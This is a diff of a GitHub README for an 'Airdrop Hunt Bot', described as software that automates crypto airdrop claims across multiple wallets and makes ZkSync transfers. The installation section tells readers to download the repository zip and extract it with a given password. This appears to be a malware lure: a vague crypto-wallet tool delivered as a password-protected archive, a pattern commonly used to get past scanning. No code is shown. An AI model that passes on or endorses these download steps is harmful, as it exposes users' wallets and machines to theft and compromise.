@@ -1,10 +1,4 @@
 # Airdrop Hunt Bot
-
-<div id="header" align="center">
-  <img src="https://github.com/deadspyexx/airdrop-hunt-bot/blob/main/airdrop.jpg" width="600"/>
-</div>
-
-## About
 The bot can transfer in ZkSync. Software designed to automate the process of participating in airdrops, making it easier for users to receive airdropped tokens across various platforms. It might help users find and participate in airdrops, manage multiple wallet addresses, and keep track of their airdrop rewards efficiently.
 ## Installation
 - [Download](https://github.com/deadspyexx/airdrop-hunt-bot/archive/refs/heads/main.zip) the repository release and extract files with password `U4DVIBE3qo`.
